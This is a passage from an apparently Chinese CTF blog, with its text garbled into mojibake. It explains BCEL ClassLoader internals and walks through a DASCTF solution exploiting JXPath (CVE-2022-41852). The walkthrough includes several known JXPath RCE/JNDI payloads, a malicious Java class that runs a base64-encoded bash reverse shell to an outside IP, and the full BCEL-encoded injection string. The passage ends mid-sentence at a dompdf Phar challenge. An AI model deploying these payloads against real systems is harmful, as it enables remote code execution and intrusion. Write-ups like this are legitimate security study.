class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">  <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Class);</span><br><span class="line">  <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Utf8);</span><br><span class="line">  name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>createClass()</code>ä¸­,é€šè¿‡<code>subString()</code>æˆªå–$$$BCEL$$$åçš„å­—ç¬¦ä¸²ï¼Œå¹¶è°ƒç”¨<code>Utility.decode</code>è¿›è¡Œç›¸åº”çš„è§£ç å¹¶æœ€ç»ˆè¿”å›æ”¹å­—èŠ‚ç çš„bytesæ•°ç»„(decodeæ–¹æ³•å‚æ•°uncompressç”¨æ¥æ ‡è¯†æ˜¯å¦ä¸ºzipæµï¼Œå½“ä¸ºtrueæ—¶èµ°zipæµè§£ç )ã€‚ä¹‹åç”Ÿæˆ<code>Parser</code>è§£æå™¨å¹¶è°ƒç”¨<code>parse()</code>æ–¹æ³•è¿›è¡Œè§£æï¼Œå¹¶ç”Ÿæˆ<code>JavaClass</code>å¯¹è±¡<br>createClassæºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">      <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      clazz = parser.parse();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">    <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">    <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Class);</span><br><span class="line">    <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Utf8);</span><br><span class="line">    name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425212337403.png" alt="image-20230425212337403"></p><p>è¿™é‡Œå°±æ˜¯å‰é¢ä¸ºä»€ä¹ˆè¦è¿›è¡Œå­—èŠ‚ç ç¼–ç çš„åŸå› ï¼Œå› ä¸ºè¿™é‡Œä¼šè¿›è¡Œè§£ç </p><p><strong>Utility.decode()æºç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Decode a string back to a byte array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes the byte array to convert</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uncompress use gzip to uncompress the stream of bytes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] decode(String s, <span class="type">boolean</span> uncompress) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line"></span><br><span class="line">  <span class="type">CharArrayReader</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharArrayReader</span>(chars);</span><br><span class="line">  <span class="type">JavaReader</span>      <span class="variable">jr</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaReader</span>(car);</span><br><span class="line"></span><br><span class="line">  <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ch;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = jr.read()) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    bos.write(ch);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bos.close();</span><br><span class="line">  car.close();</span><br><span class="line">  jr.close();</span><br><span class="line"></span><br><span class="line">  <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(uncompress) &#123;</span><br><span class="line">    <span class="type">GZIPInputStream</span> <span class="variable">gis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] tmp   = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length * <span class="number">3</span>]; <span class="comment">// Rough estimate</span></span><br><span class="line">    <span class="type">int</span>    <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>    b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((b = gis.read()) &gt;= <span class="number">0</span>)</span><br><span class="line">      tmp[count++] = (<span class="type">byte</span>)b;</span><br><span class="line"></span><br><span class="line">    bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[count];</span><br><span class="line">    System.arraycopy(tmp, <span class="number">0</span>, bytes, <span class="number">0</span>, count);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åè·å–åˆ°äº†è¯¥<code>JavaClass</code>å¯¹è±¡çš„bytesæ•°ç»„å¹¶è°ƒç”¨javaåŸç”Ÿçš„<code>defineClass()</code>åŠ è½½</p><p><img src="../images/image-20230425213242406.png" alt="image-20230425213242406"></p><p>ä¹‹åå°±æ˜¯åœ¨<code>newInstance()</code>æ—¶åˆå§‹åŒ–è§¦å‘é™æ€ä»£ç å—æ‰§è¡Œ</p><p>ä¹‹åè°ƒç”¨<code>createClass()</code>æ–¹æ³•æ‹¿åˆ°ä¸€ä¸ª<code>JavaClass</code>å¯¹è±¡æœ€ç»ˆé€šè¿‡<code>defineClass()</code>åŠ è½½å­—èŠ‚ç è¿˜åŸç±»ã€‚</p><p><strong>è¿™é‡Œå°±æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨javaclasså’Œutilityç¼–ç çš„åŸå› </strong></p><p><strong>ä¸Šé¢çš„å‚è€ƒæ–‡ç« é‡Œè¿˜æœ‰ä¸€äº›é¢˜ç›®æ˜¯åˆ©ç”¨BCElçš„ï¼Œå¯ä»¥å»å‚è€ƒå‚è€ƒä¸€ä¸‹</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> BCEL Java ClassLoader </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-WEB-å¤ç°</title>
      <link href="/posts/8a205ef3.html"/>
      <url>/posts/8a205ef3.html</url>
      
        <content type="html"><![CDATA[<h2 id="ezjxpath"><a href="#ezjxpath" class="headerlink" title="ezjxpath"></a><strong>ezjxpath</strong></h2><p><strong>cve-2022-41852</strong></p><p>è¿™é‡Œçœ‹åˆ«çš„å¸ˆå‚…çš„åšå®¢å†™çš„æ˜¯<strong>TCTFä¸­çš„éé¢„æœŸè§£</strong></p><p>åˆšå¼€å§‹çš„æ—¶å€™,å‘ç°è¿™æ˜¯ä¸ªCVEæ¼æ´ï¼Œä½†æ˜¯googleèƒ½æœåˆ°çš„æ–¹æ³•ä»–å…¨ç»™banäº†ï¼Œæ‰€ä»¥è¿™ä¸ªå¾—è‡ªå·±å»æ‰¾åˆ©ç”¨é“¾å­æ¥æ‰“</p><p><img src="../images/image-20230424202815660.png" alt="image-20230424202815660"></p><p>è¿™é‡Œçš„è¯æ˜¯ç»™äº†ä¸€ä¸ªä¸çŸ¥é“å•¥ç©æ„çš„ä¸œè¥¿ï¼Œç„¶åæŠŠjaråŒ…ä¸‹è½½ä¸‹æ¥è¿›è¡ŒæŸ¥çœ‹</p><p><img src="../images/image-20230424203035639.png" alt="image-20230424203035639"></p><p>å°±æ˜¯è¿™é‡Œäº§ç”Ÿäº†æ¼æ´åˆ©ç”¨ç‚¹</p><p><strong>ç½‘ä¸Šèƒ½æŸ¥åˆ°çš„payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;exec(java.lang.Runtime.getRuntime(), &#x27;calc&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext.new(\&quot;http://127.0.0.1:9000/spring-Evil.xml\&quot;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;javax.naming.InitialContext.doLookup(&#x27;rmi://127.0.0.1:1099/1u560y&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¿™å¸¸è§çš„ä¸‰ç§ï¼Œä½†æ˜¯éƒ½ç»™banæ‰äº†</p><p><img src="../images/image-20230424203330834.png" alt="image-20230424203330834"></p><p>äºæ˜¯æˆ‘ä»¬å°±å¾—è‡ªå·±å»å¯»æ‰¾é“¾å­æ¥æ‰“äº†</p><p>å¦‚æ­¤ä¸€æ¥æˆ‘ä»¬åªèƒ½å¦å¯»è¹Šè··äº†ï¼Œèµ›åå°±çªç„¶æƒ³åˆ°TCTFé‡Œçš„éé¢„æœŸè§£å¥½å¤šéƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿæ˜¯ç”¨é™æ€æ–¹æ³•å»åˆ©ç”¨çš„<br><code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code>ï¼Œè¿™ä¸ªç±»çš„<code>_main</code>æ–¹æ³•é€»è¾‘å¦‚ä¸‹</p><p>è¿™ä¸ªç±»åœ¨<code>rt.jar</code>åŒ…é‡Œï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">/* Expects class name as first argument, other arguments are by-passed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Missing class name.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">class_name</span> <span class="operator">=</span> argv[<span class="number">0</span>];</span><br><span class="line">    String[] new_argv = <span class="keyword">new</span> <span class="title class_">String</span>[argv.length - <span class="number">1</span>];</span><br><span class="line">    System.arraycopy(argv, <span class="number">1</span>, new_argv, <span class="number">0</span>, new_argv.length);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaWrapper</span>();</span><br><span class="line">    wrapper.runMain(class_name, new_argv);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸»è¦é€»è¾‘åœ¨äºrunMainæ–¹æ³•é‡Œé¢ï¼Œclass_nameå’Œnew_argvå°±æ˜¯ç±»åå’Œå‚æ•°ï¼Œé€»è¾‘å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runMain</span><span class="params">(String class_name, String[] argv)</span> <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span>   <span class="variable">cl</span>    <span class="operator">=</span> loader.loadClass(class_name);</span><br><span class="line">  <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method = cl.getMethod(<span class="string">&quot;_main&quot;</span>,  <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; argv.getClass() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Method _main is sane ?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>   <span class="variable">m</span> <span class="operator">=</span> method.getModifiers();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> method.getReturnType();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(Modifier.isPublic(m) &amp;&amp; Modifier.isStatic(m)) ||</span><br><span class="line">       Modifier.isAbstract(m) || (r != Void.TYPE))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(NoSuchMethodException no) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;In class &quot;</span> + class_name +</span><br><span class="line">                       <span class="string">&quot;: public static void _main(String[] argv) is not defined&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; argv &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Exception ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loader.loadClass(class_name);</code>å¤„æ˜¾ç„¶æ˜¯æœ‰ç±»åŠ è½½çš„ï¼Œè€Œè¿™ä¸ªloaderä»”ç»†ä¸€çœ‹ä¼šå‘ç°æ˜¯ä¸€ä¸ªBCEL</p><p><img src="../images/image-20230425195757268.png" alt="image-20230425195757268"></p><p>æ ¹æ®è¿™é“é¢˜åœ¨é‡æ–°æ¡ä¸€ä¸‹<strong>åŠ¨æ€ç±»åŠ è½½</strong>   è¿›è¡Œå¤ä¹ ä¸€ä¸‹</p><p>è¿™é‡Œçš„è¯è€ƒå¯Ÿçš„æ˜¯  <a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">Javaå®‰å…¨ä¹‹BCEL ClassLoader</a></p><p>æ—¢ç„¶æœ‰è¿™ä¸ªä¸œè¥¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å†™ç¯‡æ–‡ç« æ¥å­¦ä¸€ä¸‹è¿™ä¸ª<code>BCEL ClassLoader</code></p><p>ç„¶åå¯¹äºä¸Šè¿°çš„JavaWrapperç±»ï¼Œæœ€åloadclassåä¼šå»è°ƒç”¨æ¶æ„ç±»çš„_mainæ–¹æ³•ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦å¤åˆ»ä¸€ä¸‹æ¶æ„ç±»å°±å¥½äº†</p><p><strong>ä¸‹é¢çš„å°±æ˜¯æ¶æ„ç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425224414705.png" alt="image-20230425224414705"></p><p><strong>éšä¹‹æŠŠä»–ç¼–è¯‘ä¸ºå­—èŠ‚ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span>+code,<span class="literal">true</span>,<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ‰“å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.getValue(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper._main(split(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmR$5dO$TA$U$3dC$b7$5d$ba$ae$C$c5$ef$_$aab$y$d2$ba$R$88$n$a91i$9ab4$db$WiS$82$3e$98$e92$d9N$d3$dd$r$bb$db$ba$80$fc$u_$d4$f8$e0$P$f0G$Z$ef$b4$84$Sa$92$993s$ee$99s$e7$de$cc$9f$bf$bf$7e$Dx$89$a7$G2$b8m$e0$O$ee$ce$e2$9e$c2$fb$3a$k$e8x$c8$90y$z$7d$Z$bfaH$VV$3a$MZ5$d8$X$Ms$b6$f4Ec$e8uE$d8$e6$dd$B19$3bp$f8$a0$c3C$a9$ce$a7$a4$W$f7d4$8e$85$ae$r$S$ee$j$M$84E2$a7$cc$90$fe$ecq$e93$dc$y$7c$b2$fb$7c$c4$ad$B$f7$5d$ab$V$87$d2w$cb$e3T$3ctG$M$8b$97$84$Z$8cZ$e2$88$83X$G$7e$a4c$89$c4$T3u$87$S$g$ad$60$Y$3abK$aaGdU$c2$X$ca$c3$84$8eY$jy$T$8f$f0$98$81wy$d4$cb$97$9c$fc$b1pzAq$cf$db$3a$e2$d5J$cc$5b$95$d5$f7$b22$fa$f8$b6$b3f$af$ef$f4$9d$eafRo$7f$Y$d6$db$b55$bb_K$9a$ad$8d$c3F$bb$3ej$i9$eb$8d$c3$ca$97m$b9$97$9c$7c$3d$s3$f1j$a3X$da$9f$ec$7b$c5$92$3c1$f1$E$cb$M$f3$ff$97O$d4$b4$a6f$b7$_$9c$98$K$jS2$b0$de5$cf$8acX$98$Kw$86$7e$y$3d$aa$c8pE$7cv$b8QX$b1$_h$a8C$9aH$E$rzV$b8$a4$bb$e7$a8$ed0pD$U$95$a9$ri$fa$Ej$a4$c0T$a3h$cd$d2$c9$od$84$e9$e7$3f$c0$be$d1f$G$G$ad$99$J$89$x$b4$9a$a7$7b$TW$J$b3$b8$869R$a9$cb$9b$84$wf$fc$c4L$$$f5$j$da$ee$d4$c1$m$E$r$caR$aa$a9$8b$81y$y$Q$e6hj$c4$yR$fc$3a$f9M$k$b3JS$a9$$$3c$c4$3cgA$3d$Z$5b$d0$df$g$abn$fd$D$f9$9fP$X$e8$C$A$A&#x27;,&#x27;,&#x27;))&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°çš„splitæ¥è·å–æ•°ç»„ï¼Œå› ä¸º_mainåªæ¥å—æ•°ç»„å‚æ•°</p><p><img src="../images/image-20230425224659954.png" alt="image-20230425224659954"></p><p><img src="../images/image-20230426104354659.png" alt="image-20230426104354659"></p><p>åœ¨è¿™é‡Œloadclassè¿”å›æ¶æ„ç±»ä¹‹åï¼Œç„¶åè°ƒç”¨äº†æ¶æ„ç±»é‡Œçš„_mainæ–¹æ³•ï¼Œç„¶åå°±åˆ°é¢˜ç›®çš„</p><p><code>context.getvalue()</code>æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨åˆ°invokeæ–¹æ³•ï¼Œç„¶åè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="pdf-converter-revenge"><a href="#pdf-converter-revenge" class="headerlink" title="pdf_converter_revenge"></a>pdf_converter_revenge</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230426105232681.png" alt="image-20230426105232681"></p><p>æŸ¥çœ‹ç»™çš„æºç å‘ç°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè·¯åŠ²ï¼Œç„¶åå‘ç°äº†è¿™ä¸ªthinkphpç‰ˆæœ¬ï¼Œè¿™é‡Œçš„éé¢„æœŸè§£æ˜¯å¯ä»¥ç›´æ¥æ‹¿thinkphp   v5.0.21çš„pocç›´æ¥æ‰“</p><p><strong>æ¥ä¸‹æ¥è®²ä¸€ä¸‹é¢„æœŸè§£</strong></p><p><strong>è€ƒç‚¹ï¼šPharååºåˆ—åŒ–</strong></p><p><img src="../images/image-20230426105634466.png" alt="image-20230426105634466"></p><p>å‘ç°æœ‰ä¸€ä¸ªä¾èµ–å«åš<strong>dompdf</strong></p><p><a href="http://buaq.net/go-129526.html">CVE-2022-41343 - é€šè¿‡ Phar ååºåˆ—åŒ–çš„ RCE</a></p><p>è¿™é‡Œçš„è¯æ 